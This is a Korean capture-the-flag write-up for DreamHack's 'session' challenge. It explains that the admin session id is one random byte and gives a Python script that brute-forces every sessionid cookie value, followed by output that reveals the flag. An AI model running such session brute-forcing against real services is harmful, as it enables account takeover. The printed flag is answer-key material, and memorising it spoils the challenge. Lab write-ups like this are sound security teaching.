# [DreamHack] session

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> 쿠키와 세션으로 인증 상태를 관리하는 간단한 로그인 서비스입니다.
> admin 계정으로 로그인에 성공하면 플래그를 획득할 수 있습니다.
>
> Release: [session.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8534051/session.zip)

## Analysis

### /

```python
@app.route('/')
def index():
    session_id = request.cookies.get('sessionid', None)
    try:
        username = session_storage[session_id]
    except KeyError:
        return render_template('index.html')

    return render_template('index.html', text=f'Hello {username}, {"flag is " + FLAG if username == "admin" else "you are not admin"}')
```

`sessionid` 쿠키를 통해 `session_id`를 받아서, 이 `session_id`가 `session_storage`에 있으면 `username`을 설정한다.

 `usernamd`이 `'admin'`일 경우 플래그를 획득할 수 있다.

### main

```python
if __name__ == '__main__':
    import os
    session_storage[os.urandom(1).hex()] = 'admin'
    print(session_storage)
    app.run(host='0.0.0.0', port=8000)
```

`'admin'`의 `session_id`는 초기에 1바이트 16진수로 설정된다. 브루트포싱을 하면 쉽게 알아낼 수 있다.

## Exploit

```python
import requests

url = 'http://host1.dreamhack.games:19756/'

for sessionid in range(0x100):
    cookie = {'sessionid': bytes([sessionid]).hex()}
    print(cookie)
    res = requests.get(url, cookies=cookie)
    if 'flag is' in res.text:
        print(res.text)
        break
```

```
$ python3 solve.py
{'sessionid': '00'}
{'sessionid': '01'}
{'sessionid': '02'}
...
{'sessionid': 'c9'}
<!doctype html>
<html>
  <head>
    <link rel="stylesheet" href="/static/css/bootstrap.min.css">
    <link rel="stylesheet" href="/static/css/bootstrap-theme.min.css">
    <link rel="stylesheet" href="/static/css/non-responsive.css">
    <title>Index Session</title>


  <style type="text/css">
    .important { color: #336699; }
  </style>

  </head>
<body>

    <!-- Fixed navbar -->
    <nav class="navbar navbar-default navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <a class="navbar-brand" href="/">Session</a>
        </div>
        <div id="navbar">
          <ul class="nav navbar-nav">
            <li><a href="/">Home</a></li>
            <li><a href="#">About</a></li>
          </ul>

          <ul class="nav navbar-nav navbar-right">
            <li><a href="/login">Login</a></li>
          </ul>

        </div><!--/.nav-collapse -->
      </div>
    </nav>
    <!--
      # default account: guest/guest
    -->
    <div class="container">

  <p class="important">
        Welcome !
  </p>

  <h3>
        Hello admin, flag is DH{73b3a0ebf47fd6f68ce623853c1d4f138ad91712}

  </h3>


    </div> <!-- /container -->

    <!-- Bootstrap core JavaScript -->
    <script src="/static/js/jquery.min.js"></script>
    <script src="/static/js/bootstrap.min.js"></script>
</body>
</html>
```